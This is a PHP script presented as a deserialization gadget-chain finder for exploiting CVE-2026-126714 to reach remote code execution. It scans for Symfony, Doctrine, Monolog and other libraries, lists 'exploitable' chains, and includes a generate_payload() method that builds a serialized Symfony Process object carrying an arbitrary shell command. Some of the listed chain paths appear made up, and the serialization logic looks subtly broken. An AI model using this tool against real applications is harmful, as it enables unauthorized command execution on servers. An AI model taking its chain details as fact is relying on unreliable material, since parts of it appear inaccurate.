<?php
/**
 * Gadget Chain Finder for CVE-2026-126714 RCE Exploitation
 *
 * This script detects available PHP object deserialization gadget chains
 * in installed libraries that can be used to achieve RCE via POP exploitation.
 *
 * DISCLAIMER: For authorized security testing only. Unauthorized use is illegal.
 *
 * Usage:
 *   php gadget-chain-finder.php [--json] [--deep]
 *
 * Output:
 *   - Lists available PHP libraries with known gadget chains
 *   - Identifies serializable classes
 *   - Maps __destruct, __wakeup, and magic method call chains
 */

error_reporting(E_ALL);
ini_set('display_errors', '0');

class GadgetChainFinder {

    private $chains = [];
    private $classes = [];
    private $json_output = false;
    private $deep_scan = false;

    public function __construct($json_output = false, $deep_scan = false) {
        $this->json_output = $json_output;
        $this->deep_scan = $deep_scan;
    }

    /**
     * Scan for known gadget chains in popular PHP libraries.
     */
    public function scan() {
        $this->log("[*] Scanning for exploitable gadget chains...");

        // Check for common PHP libraries with known gadget chains
        $libraries = [
            'Symfony' => ['Process', 'EventDispatcher', 'HttpFoundation'],
            'Doctrine' => ['ORM', 'Common', 'DBAL'],
            'Laravel' => ['Foundation', 'Support', 'Database'],
            'Monolog' => ['Handler', 'Processor'],
            'PHPMailer' => ['SMTP'],
            'WordPress' => ['wp-load.php'],
            'Yii' => ['base', 'db', 'web'],
        ];

        foreach ($libraries as $lib => $components) {
            if ($this->check_library_installed($lib)) {
                $this->log("[+] Found library: $lib");
                $this->scan_library_classes($lib, $components);
            }
        }

        if ($this->deep_scan) {
            $this->log("[*] Running deep scan on loaded classes...");
            $this->scan_loaded_classes();
        }

        return $this->chains;
    }

    /**
     * Check if a PHP library is installed via autoloader or in include path.
     */
    private function check_library_installed($lib) {
        switch ($lib) {
            case 'Symfony':
                return class_exists('Symfony\\Component\\Process\\Process');
            case 'Doctrine':
                return class_exists('Doctrine\\ORM\\EntityManager');
            case 'Laravel':
                return function_exists('app');
            case 'Monolog':
                return class_exists('Monolog\\Logger');
            case 'PHPMailer':
                return class_exists('PHPMailer\\PHPMailer\\PHPMailer');
            case 'WordPress':
                return file_exists(ABSPATH . 'wp-load.php');
            case 'Yii':
                return class_exists('yii\\base\\BaseObject');
            default:
                return false;
        }
    }

    /**
     * Scan a library for exploitable class chains.
     */
    private function scan_library_classes($lib, $components) {
        $exploitable = [];

        // Map known gadget chains by library
        switch ($lib) {
            case 'Symfony':
                // Symfony Process chain: __destruct -> run() -> shell_exec()
                $exploitable[] = [
                    'class' => 'Symfony\\Component\\Process\\Process',
                    'entry_point' => '__destruct',
                    'chain_path' => '__destruct -> run() -> proc_open()',
                    'rce_method' => 'property',
                    'property' => 'commandline'
                ];
                break;

            case 'Doctrine':
                // Doctrine Collection chain
                $exploitable[] = [
                    'class' => 'Doctrine\\Common\\Collections\\ArrayCollection',
                    'entry_point' => '__destruct',
                    'chain_path' => '__destruct -> _destruct_callbacks()',
                    'rce_method' => 'callable',
                    'callable' => 'array_map'
                ];
                break;

            case 'Monolog':
                // Monolog Handler chain
                $exploitable[] = [
                    'class' => 'Monolog\\Handler\\SyslogUdpHandler',
                    'entry_point' => '__destruct',
                    'chain_path' => '__destruct -> write()',
                    'rce_method' => 'reflection',
                    'info' => 'Requires specific log handler setup'
                ];
                break;
        }

        foreach ($exploitable as $chain) {
            $this->chains[] = array_merge(['library' => $lib], $chain);
        }
    }

    /**
     * Deep scan: analyze all loaded classes for magic methods.
     */
    private function scan_loaded_classes() {
        $classes = get_declared_classes();
        $magic_methods = ['__destruct', '__wakeup', '__call', '__callStatic', '__sleep', '__toString'];

        foreach ($classes as $class) {
            $reflection = new ReflectionClass($class);

            // Skip built-in and system classes
            if ($reflection->isInternal() || strpos($class, 'Exception') !== false) {
                continue;
            }

            foreach ($magic_methods as $method) {
                if ($reflection->hasMethod($method)) {
                    // Check if method is public and not deprecated
                    $rm = $reflection->getMethod($method);
                    if ($rm->isPublic()) {
                        $this->classes[] = [
                            'class' => $class,
                            'magic_method' => $method,
                            'serializable' => $reflection->isSerializable() ? 'yes' : 'unknown'
                        ];
                    }
                }
            }
        }
    }

    /**
     * Generate a serialized payload using discovered chains.
     */
    public function generate_payload($command) {
        if (empty($this->chains)) {
            return null;
        }

        // Use the first exploitable chain found
        $chain = $this->chains[0];
        $class = $chain['class'];

        // Build a serialized object based on the chain type
        if ($chain['rce_method'] === 'property') {
            // Property-based chain: set command property that gets executed
            $obj = new stdClass();
            $obj_str = 'O:' . strlen($class) . ':"' . $class . '":1:';
            $obj_str .= '{s:' . strlen($chain['property']) . ':"' . $chain['property'] . '";s:' . strlen($command) . ':"' . $command . '";}';
            return $obj_str;
        }

        return null;
    }

    /**
     * Output results in JSON or human-readable format.
     */
    public function output_results() {
        if ($this->json_output) {
            echo json_encode([
                'chains' => $this->chains,
                'classes' => $this->classes,
                'count' => count($this->chains)
            ], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES) . "\n";
        } else {
            echo "[*] Gadget Chain Scan Results\n";
            echo "===============================\n\n";

            if (!empty($this->chains)) {
                echo "[+] EXPLOITABLE CHAINS FOUND: " . count($this->chains) . "\n\n";
                foreach ($this->chains as $chain) {
                    echo "    Library: {$chain['library']}\n";
                    echo "    Class: {$chain['class']}\n";
                    echo "    Entry Point: {$chain['entry_point']}\n";
                    echo "    Chain Path: {$chain['chain_path']}\n";
                    echo "    RCE Method: {$chain['rce_method']}\n";
                    echo "    Risk: HIGH\n";
                    echo "\n";
                }
            } else {
                echo "[-] No exploitable chains detected in loaded libraries.\n";
            }

            if ($this->deep_scan && !empty($this->classes)) {
                echo "[*] Classes with Magic Methods: " . count($this->classes) . "\n\n";
                foreach ($this->classes as $cls) {
                    echo "    {$cls['class']} -> {$cls['magic_method']}\n";
                }
            }
        }
    }

    private function log($msg) {
        if (!$this->json_output) {
            echo $msg . "\n";
        }
    }
}

// Main execution
$json_output = isset($argv[1]) && $argv[1] === '--json';
$deep_scan = isset($argv[2]) && $argv[2] === '--deep' || isset($argv[1]) && $argv[1] === '--deep';

$finder = new GadgetChainFinder($json_output, $deep_scan);
$finder->scan();
$finder->output_results();
?>
